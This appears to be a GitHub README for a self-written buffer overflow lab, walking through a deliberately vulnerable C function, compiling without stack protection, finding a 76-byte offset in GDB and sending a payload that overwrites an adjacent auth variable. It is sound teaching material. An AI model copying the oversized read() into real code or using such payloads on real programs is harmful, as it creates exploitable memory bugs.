# 🔐 VAULT — Lock 1 | Buffer Overflow Exploitation

> A hands-on binary exploitation project — no hints, no addresses printed, just pure memory analysis using GDB and Python.

---

## 📌 What is This?

VAULT is a multi-layer security system written in C.  
Each layer has a vulnerability hidden inside.  
Your job — find it, analyze it, exploit it.

**Lock 1** focuses on the most fundamental exploit technique in binary exploitation:

> **Buffer Overflow — overwriting a variable in memory by sending more input than the buffer can hold.**

---

## 🧠 Concept

In C, when you declare variables inside a function, they live next to each other on the **stack** in memory.

```c
char buffer[64];        // 64 byte input box
int auth = 0xdeadbeef;  // access control variable
```

If a program reads more bytes than the buffer can hold — the extra bytes **spill over** into the next variable in memory.

That next variable here is `auth`.

If we overwrite `auth` with the correct value `0xcafebabe` — access is granted.

---

## 🔍 The Vulnerability

```c
void layer1_challenge() {
    char buffer[64];
    int auth = 0xdeadbeef;  // wrong value by default

    read(0, buffer, 200);   // ← reads 200 bytes into 64 byte buffer!

    if (auth == 0xcafebabe) {
        layer1_win();        // never reached normally
    } else {
        printf("[-] Auth failed. auth = 0x%x\n", auth);
    }
}
```

**The mistake:** `read()` accepts 200 bytes but buffer is only 64 bytes.  
**The result:** Extra bytes overflow into `auth`.

---

## 🗂️ Memory Layout

```
Stack layout inside layer1_challenge():

LOW ADDRESS
┌────────────────────────────────────────────────────┐
│  buffer         — 64 bytes  (your input goes here) │
├────────────────────────────────────────────────────┤
│  padding        — 12 bytes  (compiler alignment)   │
├────────────────────────────────────────────────────┤
│  auth           —  4 bytes  (0xdeadbeef default)   │  ← TARGET
└────────────────────────────────────────────────────┘
HIGH ADDRESS

Total offset from buffer to auth = 76 bytes
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| `gcc` | Compile the vulnerable binary |
| `GDB` | Inspect memory — find exact addresses |
| `Python3` | Craft and send the payload |
| `objdump` | Analyze binary without source |

---

## ⚙️ Setup

### 1. Clone the repo
```bash
git clone https://github.com/Brijeshzzz/RED-TEAM-STUFF.git
cd RED-TEAM-STUFF
```

### 2. Compile
```bash
gcc -g -gdwarf-4 -fno-stack-protector -no-pie -o vault vault.c
```

**Flags explained:**

| Flag | Meaning |
|---|---|
| `-g` | Add debug symbols for GDB |
| `-gdwarf-4` | Use DWARF4 format (older GDB compatible) |
| `-fno-stack-protector` | Disable stack canary protection |
| `-no-pie` | Fixed addresses — no randomization |

### 3. Run normally
```bash
./vault
```

Try option `1` with any input — always shows `Auth Failed`.

---

## 🔬 Step by Step Exploitation

### Step 1 — Open GDB
```bash
gdb ./vault
```

### Step 2 — Set breakpoint and run
```
break layer1_challenge
run
```
Choose option `1` when the menu appears.

### Step 3 — Find variable addresses
```
print &buffer
print &auth
```

Example output:
```
$1 = (char (*)[64]) 0x7fffffffda10
$2 = (int *) 0x7fffffffda5c
```

### Step 4 — Calculate offset
```
0x7fffffffda5c - 0x7fffffffda10 = 0x4c = 76 bytes
```

### Step 5 — Understand little endian
x86-64 stores values in **little endian** — bytes reversed in memory.

```
0xcafebabe  →  CA FE BA BE  (normal)
             →  BE BA FE CA  (little endian — how we send it)
```

### Step 6 — Craft the payload
```python
payload  = b'A' * 76            # fill buffer (64) + padding (12)
payload += b'\xbe\xba\xfe\xca'  # overwrite auth = 0xcafebabe
```

### Step 7 — Fire the exploit
```bash
(echo "1"; python3 -c "import sys; sys.stdout.buffer.write(b'A'*76 + b'\xbe\xba\xfe\xca')") | ./vault
```

---

## ✅ Expected Output

```
╔══════════════════════════════╗
║     VAULT SECURITY SYSTEM    ║
║         v1.0 — SECURE        ║
╚══════════════════════════════╝

[1] Password Check
[2] Access Code
[3] Vault Key
Choice:
[VAULT] Enter password:
[+] LAYER 1 BREACHED — Buffer overflow success!
```

---

## 🧩 What You Learned

| Concept | Explanation |
|---|---|
| **Buffer Overflow** | Sending more input than buffer size to overwrite adjacent memory |
| **Stack Layout** | How local variables are arranged in memory |
| **GDB** | Using a debugger to find exact memory addresses |
| **Offset Calculation** | Finding the exact distance between two variables |
| **Little Endian** | How x86 CPU stores multi-byte values in reverse |
| **Payload Crafting** | Building a precise input to overwrite a target variable |

---

## 🔒 VAULT Series

| Lock | Technique | Status |
|---|---|---|
| Lock 1 | Buffer Overflow — variable overwrite | ✅ This repo |
| Lock 2 | Function Pointer Hijack | 🔜 Coming soon |
| Lock 3 | ret2win — return address overwrite | 🔜 Coming soon |
| Lock 4 | ROP Chain — chaining multiple functions | 🔜 Coming soon |

---

## ⚠️ Disclaimer

This project is for **educational purposes only**.  
All exploitation is done on a program I wrote myself in a controlled environment.  
Do not use these techniques on systems you do not own or have permission to test.

---

## 👤 Author

**Brijesh**  
Cybersecurity enthusiast — learning binary exploitation, reverse engineering, and CTF.  
Follow along as I document the full VAULT series.

---

## ⭐ Support

If this helped you understand buffer overflows —  
give the repo a star and share it with someone learning security! 🙌